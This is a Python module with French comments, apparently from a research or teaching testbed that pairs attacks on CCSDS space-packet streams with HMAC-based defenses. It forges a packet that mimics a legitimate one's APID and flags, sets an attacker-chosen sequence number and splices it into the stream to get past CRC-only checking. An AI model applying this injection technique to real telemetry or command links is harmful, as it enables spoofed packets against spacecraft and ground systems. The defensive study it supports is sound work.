# =============================================================
# inject_packet.py – Attaque 2 / Vecteur 5 : Injection de paquet
#
# Insère un paquet CCSDS entièrement forgé dans le flux après
# un paquet ciblé. Le CRC est calculé sur la trame forgée.
# Sans HMAC, le récepteur accepte le paquet injecté comme légitime.
# =============================================================

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
from src.receiver.frame_parser import parse_stream
from src.attacks._utils import rebuildPacket


def injectPacket(
    rawStream: bytes,
    fakePayload: bytes,
    fakeSeq: int,
    insertAfterSeq: int,
    verbose: bool = True,
) -> bytes:
    """
    Insère un paquet forgé dans le flux après un numéro de séquence donné.

    Le paquet injecté reprend l'APID et les flags du premier paquet légitime
    pour paraître crédible. Son seqCount est choisi par l'attaquant.

    Args:
        rawStream:      Flux de paquets CCSDS bruts.
        fakePayload:    Payload du paquet injecté.
        fakeSeq:        seqCount attribué au paquet injecté.
        insertAfterSeq: seqCount après lequel insérer le faux paquet.
        verbose:        Afficher un log de l'injection.

    Returns:
        Flux modifié avec le paquet forgé inséré.

    Détection (Défense 2) :
        → HMAC_FAIL      : si fakeSeq est déjà dans le tag map
        → HMAC_UNKNOWN   : si fakeSeq est inconnu du tag map
        → DUPLICATE_SEQ  : si fakeSeq duplique un seqCount existant
    """
    packets = parse_stream(rawStream)

    # Référence pour les champs constants (APID, flags, version…)
    ref = packets[0] if packets else {
        "apid": 1, "seqFlags": 3,
        "version": 0, "packetType": 0, "secHdrFlag": 0,
    }

    fakePkt = rebuildPacket(
        apid       = ref["apid"],
        seqFlags   = ref["seqFlags"],
        seqCount   = fakeSeq,
        version    = ref["version"],
        packetType = ref["packetType"],
        secHdrFlag = ref["secHdrFlag"],
        payload    = fakePayload,
    )

    # Trouver l'offset d'insertion (après le paquet cible)
    insertOffset = 0
    for pkt in packets:
        insertOffset += pkt["totalSize"]
        if pkt["seqCount"] == insertAfterSeq:
            break

    result = rawStream[:insertOffset] + fakePkt + rawStream[insertOffset:]

    if verbose:
        print(
            f"[A2/injectPacket] Paquet forgé seqCount={fakeSeq} "
            f"inséré après seqCount={insertAfterSeq}  ({len(fakePkt)} octets)"
        )

    return result
